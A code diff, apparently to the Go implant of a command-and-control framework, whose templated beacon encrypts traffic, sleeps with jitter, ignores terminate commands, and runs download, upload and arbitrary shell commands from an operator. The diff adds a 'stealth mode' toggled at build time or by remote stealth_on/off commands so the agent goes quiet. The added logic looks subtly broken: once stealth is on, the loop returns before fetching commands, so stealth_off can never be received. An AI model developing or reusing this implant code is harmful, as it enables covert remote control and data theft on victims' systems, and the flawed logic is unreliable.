@@ -36,7 +36,10 @@ const (
     MALEABLE   = "{maleable}"
     USER_AGENT = "{useragent}"
     MAX_RETRIES = 3
+    STEALTH    = "{stealth}"
 )
+
+var stealthModeEnabled bool 
 
 type Aes256Key struct {
     Key []byte
@@ -59,6 +62,31 @@ func initEncryptionContext(keyHex string) *PacketEncryptionContext {
         AesKey:  &Aes256Key{Key: keyBytes},
         Valid:   true,
         Enabled: true,
+    }
+}
+
+// Función para inicializar el modo sigiloso
+func initStealthMode() {
+    if STEALTH == "True" || STEALTH == "true" {
+        stealthModeEnabled = true
+        fmt.Println("[INFO] Stealth mode initialized as ENABLED")
+    } else {
+        stealthModeEnabled = false
+        fmt.Println("[INFO] Stealth mode initialized as DISABLED")
+    }
+}
+
+// Función para manejar comandos stealth_on/off
+func handleStealthCommand(command string) {
+    switch command {
+    case "stealth_on":
+        stealthModeEnabled = true
+        fmt.Println("[INFO] Stealth mode ENABLED by command")
+    case "stealth_off":
+        stealthModeEnabled = false
+        fmt.Println("[INFO] Stealth mode DISABLED by command")
+    default:
+        // No hacer nada si el comando no es relevante
     }
 }
 
@@ -308,6 +336,9 @@ func main() {
 	minJitterPercentage := 0.1
 	maxJitterPercentage := 0.3
     keyHex := "{key}"
+
+    initStealthMode()
+
     encryptionCtx = initEncryptionContext(keyHex)
     if encryptionCtx == nil {
         fmt.Println("[FATAL] Failed to initialize encryption")
@@ -322,6 +353,12 @@ func main() {
         func() {
 
             defer globalRecover()
+            
+            if stealthModeEnabled {
+                fmt.Println("[DEBUG] Stealth mode is active. Skipping activity.")
+                return
+            }
+
             ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
             defer cancel()
 
@@ -341,16 +378,20 @@ func main() {
             if command == "" {
                 return
             }
-
-            switch {
-            case strings.HasPrefix(command, "download:"):
-                handleDownload(ctx, command)
-            case strings.HasPrefix(command, "upload:"):
-                handleUpload(ctx, command)
-            case strings.Contains(command, "terminate"):
-                fmt.Println("[INFO] Ignoring terminate command")
-            default:
-                handleCommand(ctx, command, shellCommand)
+            // Manejar comandos stealth_on/off
+            handleStealthCommand(command)
+            // Continuar con el procesamiento normal si no es un comando de stealth
+            if !strings.Contains(command, "stealth") {
+                switch {
+                case strings.HasPrefix(command, "download:"):
+                    handleDownload(ctx, command)
+                case strings.HasPrefix(command, "upload:"):
+                    handleUpload(ctx, command)
+                case strings.Contains(command, "terminate"):
+                    fmt.Println("[INFO] Ignoring terminate command")
+                default:
+                    handleCommand(ctx, command, shellCommand)
+                }
             }
         }()
 		sleepTime := calculateJitteredSleep(baseSleepTime, minJitterPercentage, maxJitterPercentage)
